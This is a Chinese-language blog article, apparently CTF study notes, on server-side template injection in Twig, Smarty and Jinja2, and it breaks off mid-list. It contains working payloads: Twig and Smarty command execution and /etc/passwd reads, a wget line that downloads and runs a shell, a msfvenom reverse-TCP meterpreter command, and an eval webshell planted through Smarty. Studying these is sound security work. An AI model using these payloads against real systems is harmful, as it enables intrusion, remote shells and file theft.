<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[ctf] ssti模板注入</title>
    <link href="/2023/01/30/%5Bctf%5D%20ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/01/30/%5Bctf%5D%20ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI——模板注入"><a href="#SSTI——模板注入" class="headerlink" title="SSTI——模板注入"></a>SSTI——模板注入</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p><p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13653563.html">2. SSTI（模板注入）漏洞（cms实例篇） - bmjoker - 博客园 (cnblogs.com)</a></p></blockquote><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p><p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/1344396-20200911174631687-758048107.png" alt="img"></p><h2 id="php中的ssti"><a href="#php中的ssti" class="headerlink" title="php中的ssti"></a>php中的ssti</h2><p>php中常见的模板：</p><ul><li>twig</li><li>smarty</li><li>blade</li></ul><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>Twig是一个灵活、高效并且安全的PHP模板引擎。</p><p><strong>Twig需要的最低PHP版本为5.2.4。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>　　<span class="hljs-keyword">require_once</span> <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;<br>　　<span class="hljs-title class_">Twig_Autoloader</span>::<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-literal">true</span>);<br>　　<span class="hljs-variable">$twig</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Twig_Environment</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Twig_Loader_String</span>());<br>　　<span class="hljs-variable">$output</span> = <span class="hljs-variable">$twig</span>-&gt;<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>]));  <span class="hljs-comment">// 将用户输入作为模版变量的值</span><br>　　<span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Twig使用一个加载器 <code>loader(Twig_Loader_Array)</code> 来定位模板，以及一个环境变量 <code>environment(Twig_Environment)</code> 来存储配置信息。</p><p>其中，<code>render()</code> 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p><p>使用 Twig 模版引擎渲染页面，其中模版含有 <code>&#123;&#123;name&#125;&#125;</code> 变量，其模版变量值来自于GET请求参数<code>$_GET[&quot;name&quot;]</code> 。</p><p>显然这段代码并没有什么问题，即使你想通过<code>name</code>参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击。</p><p>但是如果渲染的模版内容受到用户的控制,情况就不一样了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>　　<span class="hljs-keyword">require_once</span> <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/../lib/Twig/Autoloader.php&#x27;</span>;<br>　　<span class="hljs-title class_">Twig_Autoloader</span>::<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-literal">true</span>);<br>　　<span class="hljs-variable">$twig</span>=<span class="hljs-title function_ invoke__">newTwig_Environment</span>(<span class="hljs-title function_ invoke__">newTwig_Loader_String</span>());<br>　　<span class="hljs-variable">$output</span>=<span class="hljs-variable">$twig</span>-&gt;<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-string">&quot;Hello <span class="hljs-subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);<span class="hljs-comment">// 将用户输入作为模版内容的一部分</span><br>　　<span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见。</p><p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p><p>在Twig模板引擎里，<code>&#123;&#123;var&#125;&#125;</code> 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p><p>例如这里用户输入<code>name=&#123;&#123;2*10&#125;&#125;</code> ，则最后显示的结果为<code>20</code>。</p><p>同样，如果插入一些字符和Twig模板注释及表达式，<code>xyz&#123;&#123;2*10&#125;&#125;zyx</code>，最后显示为<code>xyz20zyx</code>。</p><p>如何检测SSTI？如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;$what&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Welcome, </span><span class="hljs-template-variable">&#123;&#123;username&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><span class="hljs-template-tag">&#123;%$<span class="hljs-name">a</span>%&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后尝试使用表达式，比如<code>&#123;&#123;2+28&#125;&#125;</code>，查看响应。</p><p>针对twid的攻击荷载：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>使用msf生成php的有效荷载：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p php<span class="hljs-regexp">/meterpreter/</span>reverse_tcp -f raw LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">127.131</span> LPORT=<span class="hljs-number">4321</span> &gt; <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.txt<br></code></pre></td></tr></table></figure><p>msf进行监听；在目标上远程下载shell，并重命名运行：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><hr><p>如果使用的是twig3.x版本，新增了<code>filter</code>和<code>map</code>等语法，可以尝试这些payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>|file_excerpt(<span class="hljs-name">1</span>,<span class="hljs-number">30</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">app.request.files.get</span>(<span class="hljs-name">1</span>).__construct(<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">app.request.files.get</span>(<span class="hljs-name">1</span>).openFile.fread(<span class="hljs-name">99</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;whoami&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.enableDebug</span>()&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.isDebug</span>()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;system&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)</span><br><span class="hljs-template-variable"></span><br><span class="hljs-template-variable">&#123;&#123;&#123;<span class="hljs-string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="hljs-name">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;,0]</span>|sort(<span class="hljs-name">&quot;system&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;system&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0,0]</span>|reduce(<span class="hljs-name">&quot;system&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&#x27;cat /etc/passwd&#x27;]</span>|filter(<span class="hljs-name">&#x27;system&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://xz.aliyun.com/t/7518">TWIG 全版本通用 SSTI payloads - 先知社区 (aliyun.com)</a></p></blockquote><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个<code>disable_function</code>)。</p><p>但是，实际上对语言的限制并不能影响我们执行命令，<code>$smarty</code>内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smarty<span class="hljs-regexp">/libs/</span>sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/1344396-20200910234359019-777787778.png" alt="img"></p><p>因此我们可以用这个方法读文件，payload：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;self::<span class="hljs-built_in">getStreamVariable</span>(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>同样在</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smarty<span class="hljs-regexp">/libs/</span>sysplugins/smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法<br></code></pre></td></tr></table></figure><p>其源码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Smarty_Internal_Write_File</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Writes file in a safe way to disk</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  string $_filepath complete filepath</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  string $_contents file content</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  Smarty $smarty    smarty instance</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> SmartyException</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> boolean true</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeFile</span>(<span class="hljs-params"><span class="hljs-variable">$_filepath</span>, <span class="hljs-variable">$_contents</span>, Smarty <span class="hljs-variable">$smarty</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$_error_reporting</span> = <span class="hljs-title function_ invoke__">error_reporting</span>();<br>        <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smarty</span>-&gt;_file_perms !== <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-variable">$old_umask</span> = <span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$_dirpath</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_filepath</span>);<br>        <span class="hljs-comment">// if subdirs, create dir structure</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_dirpath</span> !== <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; !<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_dirpath</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$_dirpath</span>, <span class="hljs-variable">$smarty</span>-&gt;_dir_perms === <span class="hljs-literal">null</span> ? <span class="hljs-number">0777</span> : <span class="hljs-variable">$smarty</span>-&gt;_dir_perms, <span class="hljs-literal">true</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// write to tmp file, then move to overt file lock race condition</span><br>        <span class="hljs-variable">$_tmp_file</span> = <span class="hljs-variable">$_dirpath</span> . DS . <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>), <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-string">&#x27;wrt&#x27;</span>, <span class="hljs-literal">true</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_tmp_file</span>, <span class="hljs-variable">$_contents</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-variable">$_error_reporting</span>);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartyException</span>(<span class="hljs-string">&quot;unable to write file <span class="hljs-subst">&#123;$_tmp_file&#125;</span>&quot;</span>);<br>       &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Windows&#x27; rename() fails if the destination exists,</span><br><span class="hljs-comment">         * Linux&#x27; rename() properly handles the overwrite.</span><br><span class="hljs-comment">         * Simply unlink()ing a file might cause other processes</span><br><span class="hljs-comment">         * currently reading that file to fail, but linux&#x27; rename()</span><br><span class="hljs-comment">         * seems to be smart enough to handle that for us.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Smarty</span>::<span class="hljs-variable">$_IS_WINDOWS</span>) &#123;<br>            <span class="hljs-comment">// remove original file</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$_filepath</span>)) &#123;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filepath</span>);<br>            &#125;<br>            <span class="hljs-comment">// rename tmp file</span><br>            <span class="hljs-variable">$success</span> = @<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$_tmp_file</span>, <span class="hljs-variable">$_filepath</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// rename tmp file</span><br>            <span class="hljs-variable">$success</span> = @<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$_tmp_file</span>, <span class="hljs-variable">$_filepath</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$success</span>) &#123;<br>                <span class="hljs-comment">// remove original file</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$_filepath</span>)) &#123;<br>                    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filepath</span>);<br>                &#125;<br>                <span class="hljs-comment">// rename tmp file</span><br>                <span class="hljs-variable">$success</span> = @<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$_tmp_file</span>, <span class="hljs-variable">$_filepath</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$success</span>) &#123;<br>            <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-variable">$_error_reporting</span>);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartyException</span>(<span class="hljs-string">&quot;unable to write file <span class="hljs-subst">&#123;$_filepath&#125;</span>&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smarty</span>-&gt;_file_perms !== <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// set file permissions</span><br>            <span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$_filepath</span>, <span class="hljs-variable">$smarty</span>-&gt;_file_perms);<br>            <span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-variable">$old_umask</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-variable">$_error_reporting</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 <code>writeFile</code> 函数第三个参数一个 <code>Smarty</code> 类型，后来找到了 <code>self::clearConfig()</code>，函数原型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearConfig</span>(<span class="hljs-params"><span class="hljs-variable">$varname</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Smarty_Internal_Extension_Config</span>::<span class="hljs-title function_ invoke__">clearConfig</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$varname</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>因此我们可以构造payload写个webshell:</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;,self::clearConfig())&#125;</span><br></code></pre></td></tr></table></figure><hr><p>Smarty的SSTI用法有：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;$smarty.version&#125;</span><span class="language-xml">  #获取smarty的版本号</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;php&#125;</span><span class="language-xml">phpinfo();</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">php</span>&#125;</span><span class="language-xml">  #执行相应的php代码</span><br><span class="language-xml">Smarty支持使用 </span><span class="hljs-template-variable">&#123;php&#125;</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">php</span>&#125;</span><span class="language-xml"> 标签来执行被包裹其中的php指令，但是在Smarty3版本中已经废弃</span><span class="hljs-template-variable">&#123;php&#125;</span><span class="language-xml">标签。</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><span class="language-xml"></span><br><span class="language-xml">在3.1.30的Smarty版本中官方已经把该静态方法删除。</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;<span class="hljs-keyword">if</span> phpinfo()&#125;</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">if</span>&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;<span class="hljs-keyword">if</span> system(&quot;id&quot;)&#125;</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">if</span>&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h3 id="Blade"><a href="#Blade" class="headerlink" title="Blade*"></a>Blade*</h3><p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p><blockquote><p><a href="https://www.cnblogs.com/sgm4231/p/10283661.html">laravel Blade 模板引擎 - 心之所依 - 博客园 (cnblogs.com)</a></p></blockquote><h2 id="Python中的SSTI"><a href="#Python中的SSTI" class="headerlink" title="Python中的SSTI"></a>Python中的SSTI</h2><p>python常见的模板有：</p><ul><li>Jinja2</li><li>tornado</li></ul><h3 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h3><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</p><p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了 <code>&#123;&#123;…&#125;&#125;</code> 块</p><p>Jinja2使用 <code>&#123;&#123;name&#125;&#125;</code>结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p><p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__dict__</span>　　 ：保存类实例或对象实例的属性变量键值对字典<br><span class="hljs-strong">__class__</span>　　：返回一个实例所属的类<br><span class="hljs-strong">__mro__</span>　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-strong">__bases__</span>　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）<span class="hljs-strong">__base__</span>　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组<br>// <span class="hljs-strong">__base__</span>和<span class="hljs-strong">__mro__</span>都是用来寻找基类的<br><span class="hljs-strong">__subclasses__</span>　　：以列表返回类的子类<br><span class="hljs-strong">__init__</span>　　 ：类的初始化方法<br><span class="hljs-strong">__globals__</span>　　   ：对包含函数全局变量的字典的引用<span class="hljs-strong">__builtin__</span>&amp;&amp;<span class="hljs-strong">__builtins__</span>　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在<span class="hljs-strong">__builtin__</span>可以查到。查看的方法是dir(<span class="hljs-strong">__builtins__</span>)　　　　　　　　　　　　　　　　　　在py3中<span class="hljs-strong">__builtin__</span>被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，<span class="hljs-strong">__builtins__</span>是对内建模块<span class="hljs-strong">__builtin__</span>本身的引用，即<span class="hljs-strong">__builtins__</span>完全等价于<span 